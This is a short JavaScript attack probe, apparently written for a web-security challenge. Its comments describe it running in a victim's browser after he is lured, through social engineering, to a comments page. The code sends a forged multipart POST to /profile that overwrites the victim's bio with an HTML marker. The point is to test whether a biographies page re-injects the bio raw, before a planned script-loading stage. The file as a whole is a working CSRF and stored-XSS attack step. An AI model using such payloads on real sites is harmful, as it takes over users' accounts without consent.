// TEST probe — runs in Pepe's browser when he loads /comments (forced via social engineering).
// Sets Pepe's bio to a harmless HTML marker to determine whether /biographies escapes
// the bio or re-injects it raw. Load /biographies afterwards:
//   - "xsstest" shown in bold  => bio is NOT sanitized => <script src> will work (use stage1.js)
//   - literal "<b>xsstest</b>"  => bio is escaped      => need another vector
//
// Reuses the Desafio 9 technique: POST /profile is multipart/form-data with fields
// `bio` and `profile_pic`, no anti-CSRF token, cookie sent automatically (same-origin).

(async () => {
    // 1x1 red pixel JPEG, base64-encoded (profile_pic is required by the form).
    const b64 = "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAj/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAX/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwCdABmX/9k=";
    const bin = atob(b64);
    const bytes = new Uint8Array(bin.length);
    for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
    const imgBlob = new Blob([bytes], { type: "image/jpeg" });

    const fd = new FormData();
    fd.append("bio", "<b>xsstest</b>");
    fd.append("profile_pic", imgBlob, "probe.jpg");

    await fetch("/profile", {
        method: "POST",
        credentials: "include", // same-origin: session cookie sent automatically
        body: fd
    });
})();
